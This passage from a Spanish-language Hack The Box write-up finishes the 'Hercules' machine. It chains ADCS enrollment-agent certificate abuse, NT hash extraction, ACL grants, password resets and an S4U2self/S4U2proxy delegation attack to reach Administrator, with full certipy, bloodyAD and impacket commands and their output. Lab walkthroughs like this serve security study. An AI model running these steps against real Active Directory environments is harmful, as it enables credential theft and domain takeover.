Ejecuta el ataque:
```bash
KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-host dc.hercules.htb -dc-ip 10.10.11.91 -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "EnrollmentAgent" -application-policies "Certificate Request Agent"
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 41
[*] Successfully requested certificate
[*] Got certificate with UPN 'fernando.r@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1121'
[*] Saving certificate and private key to 'fernando.r.pfx'
[*] Wrote certificate and private key to 'fernando.r.pfx'
```
Con este certificado, estamos suplantando al **usuario fernando.r**.

Ahora, como este usuario, crearemos un nuevo certificado para suplantar al **usuario ashley.b**:
```bash
KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca "CA-HERCULES" -template "User" -pfx fernando.r.pfx -on-behalf-of "HERCULES\\ashley.b" -dcom
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via DCOM
[*] Request ID is 42
[*] Successfully requested certificate
[*] Got certificate with UPN 'ashley.b@hercules.htb'
[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Saving certificate and private key to 'ashley.b.pfx'
[*] Wrote certificate and private key to 'ashley.b.pfx'
```
Ya estamos suplantando al **usuario ashley.b**.

#### Aplicando un Movimiento Lateral para Autenticarnos como Usuario ashley.b {#MovLateral}

Podemos utilizar este certificado para autenticarnos al **AD** y nos otorgue el **Hash NT** válido para el **usuario ashley.b**:
```bash
certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.10.11.91
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2
```
Tenemos el Hash.

Creamos el **TGT** del **usuario ashley.b**:
```bash
impacket-getTGT -hashes :1e719fbfddd226da74f644eac9df7fd2 hercules.htb/ashley.b@dc.hercules.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ashley.b@dc.hercules.htb.ccache
```

Nos conectamos a la máquina usando la herramienta **winrmexe**:
```batch
KRB5CCNAME=ashley.b@dc.hercules.htb.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass hercules.htb/ashley.b@dc.hercules.htb
...
PS C:\Users\ashley.b\Documents> whoami
hercules\ashley.b
```
Estamos dentro.

Si nos movemos un poco, encontraremos un script de **PowerShell**:
```batch
PS C:\Users\ashley.b\Documents> cd ../Desktop
PS C:\Users\ashley.b\Desktop> dir

    Directory: C:\Users\ashley.b\Desktop

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:45 AM                Mail                                                                  
-a----         12/4/2024  11:45 AM            102 aCleanup.ps1
```

Este script parece que está hecho para resetear contraseñas, por lo que nos puede ser útil para más adelante:
```batch
PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
Start-ScheduledTask -TaskName "Password Cleanup"
```

Llegados a este punto, ¿Por qué suplantamos al **usuario ashley.b**?

Resulta que este usuario pertenece al grupo **IT Support**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura41.png">
</p>

Si revisamos la descripción de este grupo, vemos que se menciona como **Password Support**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura42.png">
</p>

Normalmente, esta clase de descripciones están relacionadas con la administración de contraseñas dentro del dominio.

Entonces, es buena idea que podamos asignarle más permisos a este grupo, pues nos puede servir para más adelante.

Le asignamos el permiso **GenericAll** al grupo **IT Support**:
```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host 'dc.hercules.htb' -d 'hercules.htb' -u 'auditor' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
[+] IT SUPPORT has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

Y de paso, le damos el permiso **GenericAll** al **usuario auditor**:
```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
[+] Auditor has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB
```
Esto último es para tener el control administrativo de todo el **OU**.

### Rehabilitando Usuario IIS_Administrator para Modificar Contraseña de Usuario IIS_webserver$ {#IIS_Support}

Investigando un poco más con **BloodHound**, encontramos el grupo **Service Operators**, que no pudimos identificar a sus usuarios:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura43.png">
</p>

Ya que tenemos una sesión activa, tanto como **auditor** como con **ashley.b**, podemos investigar qué usuarios pertenecen a este grupo:
```batch
PS C:\Users\auditor\Documents> Get-ADGroupMember -Identity "Service Operators" -Recursive | Where {$_.objectClass -eq 'user'} | Select Name, SamAccountName, DistinguishedName

Name              SamAccountName    DistinguishedName                                                        
----              --------------    -----------------                                                        
IIS_Administrator iis_administrator CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```
Tenemos a un usuario llamado **iis_administrator**.

Pero resulta que está deshabilitado:
```batch
PS C:\Users\auditor\Documents> Get-ADUser -Identity "IIS_administrator"

DistinguishedName : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : IIS_Administrator
Name              : IIS_Administrator
ObjectClass       : user
ObjectGUID        : 0ed3b2f9-aefa-41e7-9dcb-c7116ca37a1d
SamAccountName    : iis_administrator
SID               : S-1-5-21-1889966460-2597381952-958560702-1119
Surname           : 
UserPrincipalName : iis_administrator@hercules.htb
```

Este usuario se ha vuelto ahora nuestra prioridad, pues si revisamos qué es lo que puede hacer el grupo **Service Operators**, es que puede cambiar la contraseña del **usuario IIS_weberver$**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura44.png">
</p>

Resulta que el **usuario IIS_weberver$**, tiene un permiso especial y peligroso si logramos suplantarlo:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura45.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura46.png">
</p>

En resumen, podemos aplicar el ataque **S4U2self/S4U2proxy Abuse Chain**, si es que logramos suplantar al **usuario IIS_webserver$**.

Este ataque lo explicaremos más adelante.

Primero, habilitemos al **usuario IIS_administrator**: 
```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k remove uac "IIS_Administrator" -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from IIS_Administrator's userAccountControl
```
Ya está habilitado, puedes comprobarlo.

Podemos cambiarle la contraseña usando nuestro **usuario auditor**, pero para esto ejecutaremos el script **aCleanup.ps1**, pues nos permitirá resetear cualquier contraseña sin conflictos.

Aunque puede que elimine los permisos **GenercAll** del grupo **IT Support** y del **usuario auditor**, por lo que después de ejecutarlo, puedes volver a asignarle esos permisos solo para estar seguros de que no se hayan eliminado:
```batch
PS C:\Users\ashley.b\Desktop> .\aCleanup.ps1
```

Ahora sí, cambiemos la contraseña del usuario **IIS_administrator**:
```bash
KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k set password "IIS_Administrator" "Passw0rd@123"
[+] Password changed successfully!
```

Vamos a crearle un **TGT** de una vez:
```bash
impacket-getTGT hercules.htb/'iis_administrator':'Passw0rd@123' -dc-ip 10.10.11.91
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_administrator.ccache
```

Ya con el **TGT**, podemos cambiarle la contraseña al **usuario IIS_webserver$** usando **bloodyAD**:
```bash
KRB5CCNAME=iis_administrator.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'IIS_Administrator' -k set password "iis_webserver$" Passw0rd@123
[+] Password changed successfully!
```

Podemos convertir esa contraseña en un **Hash NT**:
```bash
iconv -f ASCII -t UTF-16LE <(printf 'Passw0rd@123') | openssl dgst -md4
MD4(stdin)= 14d0fcda7ad363097760391f302da68d
```

Y usamos ese **Hash NT** para crear un **TGT** válido del **usuario IIS_webserver$** con tal de suplantarlo:
```bash
impacket-getTGT -hashes :14d0fcda7ad363097760391f302da68d 'hercules.htb/IIS_webserver$' -dc-ip 10.10.11.91
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in IIS_webserver$.ccache
```

### Aplicando el Ataque S4U2self/S4U2proxy Abuse Chain para Escalar Privilegios {#AbuseChaing}

¿Qué es el ataque **S4U2self/S4U2proxy Abuse Chain**?

| **S4U2self/S4U2proxy Abuse Chain** |
|:----------------------------------:|
| *Es cuando un atacante abusa de una configuración legítima de delegación Kerberos para impersonar a otros usuarios (incluso admins) sin tener sus credenciales. Si una cuenta de servicio o máquina tiene delegación (por ejemplo, “constrained delegation”), puedes encadenar S4U2self → S4U2proxy para obtener tickets de servicio como otro usuario (hasta Domain Admin).* |

Te dejo aquí unos blogs que explican este ataque y muestran ejemplos prácticos:
* <a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse" target="_blank">S4U2self abuse</a>
* <a href="https://www.blackhillsinfosec.com/abusing-s4u2self-for-active-directory-pivoting/" target="_blank">Abusing S4U2Self for Active Directory Pivoting</a>
* <a href="https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c" target="_blank">S4U2Pwnage</a>

Para aplicar el ataque, necesitamos el **Session Key Hash** del **TGT** del **usuario IIS_webserver$**:
```bash
impacket-describeTicket 'IIS_webserver$.ccache' | grep 'Ticket Session Key'
[*] Ticket Session Key            : 0d065e8e9e6fc09f7a8483a77f1c1be3
```

Utilizando este Hash, podemos cambiarle la contraseña al **usuario IIS_webserver$**:
```bash
impacket-changepasswd -newhashes :0d065e8e9e6fc09f7a8483a77f1c1be3 'hercules.htb'/'IIS_webserver$':'Passw0rd@123'@'dc.hercules.htb' -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of hercules.htb\IIS_webserver$
[*] Connecting to DCE/RPC as hercules.htb\IIS_webserver$
[-] CCache file is not found. Skipping...
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```
Funcionó.

Ahora, para aplicar el ataque, utilizaremos la herramienta **impacket-getST** y le indicamos que queremos suplantar al **usuario Administrator**:
```bash
KRB5CCNAME=IIS_webserver$.ccache impacket-getST -u2u -impersonate "Administrator" -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb'/'IIS_webserver$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
```
Excelente, nos generó un **archivo ccache**, siendo un **TGS**.

Utilicemos este **TGS** para autenticarnos en el **AD** como el **usuario Administrator**:
```batch
KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
...
PS C:\Users\Administrator\Documents> whoami
hercules\administrator
```
Estamos dentro y tenemos máximos privilegios.

Busquemos la última flag:
```batch
PS C:\Users\Administrator\Desktop> cd ../../Admin/Desktop
PS C:\Users\Admin\Desktop> dir

    Directory: C:\Users\Admin\Desktop

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---        10/25/2025  10:54 AM             34 root.txt                                                              

PS C:\Users\Admin\Desktop> type root.txt
...
```
Y con esto terminamos la máquina.
